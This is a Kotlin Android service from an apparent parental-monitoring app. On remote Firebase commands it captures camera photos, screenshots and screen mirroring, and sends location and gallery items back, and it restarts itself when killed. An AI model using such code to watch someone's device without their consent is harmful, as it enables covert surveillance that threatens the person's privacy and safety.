package com.parentkidsapp.kids

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.parentkidsapp.R
import com.parentkidsapp.models.*
import com.parentkidsapp.services.FirebaseService
import com.parentkidsapp.utils.PreferenceManager

class MonitoringService : Service() {

    private lateinit var preferenceManager: PreferenceManager
    private lateinit var firebaseService: FirebaseService
    private lateinit var cameraHandler: CameraHandler
    private lateinit var locationHandler: LocationHandler
    private lateinit var screenCaptureHandler: ScreenCaptureHandler
    private lateinit var galleryHandler: GalleryHandler
    
    companion object {
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "MonitoringServiceChannel"
    }

    override fun onCreate() {
        super.onCreate()
        
        preferenceManager = PreferenceManager(this)
        firebaseService = FirebaseService()
        
        // Initialize handlers
        cameraHandler = CameraHandler(this, firebaseService)
        locationHandler = LocationHandler(this, firebaseService)
        screenCaptureHandler = ScreenCaptureHandler(this, firebaseService)
        galleryHandler = GalleryHandler(this, firebaseService)
        
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        
        initializeFirebaseAndStartListening()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Restart service if killed
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Monitoring Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Keeps the monitoring service running"
                setShowBadge(false)
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.monitoring_service_title))
            .setContentText(getString(R.string.monitoring_service_description))
            .setSmallIcon(R.drawable.ic_kids)
            .setOngoing(true)
            .setAutoCancel(false)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun initializeFirebaseAndStartListening() {
        val deviceId = preferenceManager.getDeviceId() ?: return
        
        firebaseService.initialize(deviceId) { success ->
            if (success) {
                // Start listening for commands
                firebaseService.listenForCommands(deviceId) { command ->
                    handleCommand(command)
                }
                
                // Update device status
                firebaseService.updateDeviceStatus(deviceId, true)
                
                // Start periodic location updates
                locationHandler.startLocationUpdates()
            }
        }
    }

    private fun handleCommand(command: MonitoringCommand) {
        when (command.commandType) {
            CommandType.CAPTURE_FRONT_CAMERA -> {
                cameraHandler.captureImage(CameraType.FRONT) { success, imageUrl ->
                    val status = if (success) CommandStatus.COMPLETED else CommandStatus.FAILED
                    firebaseService.sendCommandResponse(command.id, status, imageUrl)
                }
            }
            
            CommandType.CAPTURE_BACK_CAMERA -> {
                cameraHandler.captureImage(CameraType.BACK) { success, imageUrl ->
                    val status = if (success) CommandStatus.COMPLETED else CommandStatus.FAILED
                    firebaseService.sendCommandResponse(command.id, status, imageUrl)
                }
            }
            
            CommandType.CAPTURE_SCREENSHOT -> {
                screenCaptureHandler.captureScreen { success, imageUrl ->
                    val status = if (success) CommandStatus.COMPLETED else CommandStatus.FAILED
                    firebaseService.sendCommandResponse(command.id, status, imageUrl)
                }
            }
            
            CommandType.START_SCREEN_MIRROR -> {
                screenCaptureHandler.startScreenMirroring { success ->
                    val status = if (success) CommandStatus.COMPLETED else CommandStatus.FAILED
                    firebaseService.sendCommandResponse(command.id, status, "Screen mirroring started")
                }
            }
            
            CommandType.STOP_SCREEN_MIRROR -> {
                screenCaptureHandler.stopScreenMirroring()
                firebaseService.sendCommandResponse(command.id, CommandStatus.COMPLETED, "Screen mirroring stopped")
            }
            
            CommandType.GET_LOCATION -> {
                locationHandler.getCurrentLocation { success, location ->
                    val status = if (success) CommandStatus.COMPLETED else CommandStatus.FAILED
                    firebaseService.sendCommandResponse(command.id, status, location)
                }
            }
            
            CommandType.GET_GALLERY -> {
                galleryHandler.getGalleryItems { success, items ->
                    val status = if (success) CommandStatus.COMPLETED else CommandStatus.FAILED
                    firebaseService.sendCommandResponse(command.id, status, items)
                }
            }
            
            CommandType.GET_NOTIFICATIONS -> {
                // Notifications are handled by NotificationListenerService
                firebaseService.sendCommandResponse(command.id, CommandStatus.COMPLETED, "Notifications monitoring active")
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        
        // Update device status
        val deviceId = preferenceManager.getDeviceId()
        if (deviceId != null) {
            firebaseService.updateDeviceStatus(deviceId, false)
        }
        
        // Stop handlers
        locationHandler.stopLocationUpdates()
        screenCaptureHandler.stopScreenMirroring()
        
        // Restart service if monitoring is still active
        if (preferenceManager.isMonitoringActive()) {
            val restartIntent = Intent(this, MonitoringService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent)
            } else {
                startService(restartIntent)
            }
        }
    }
}

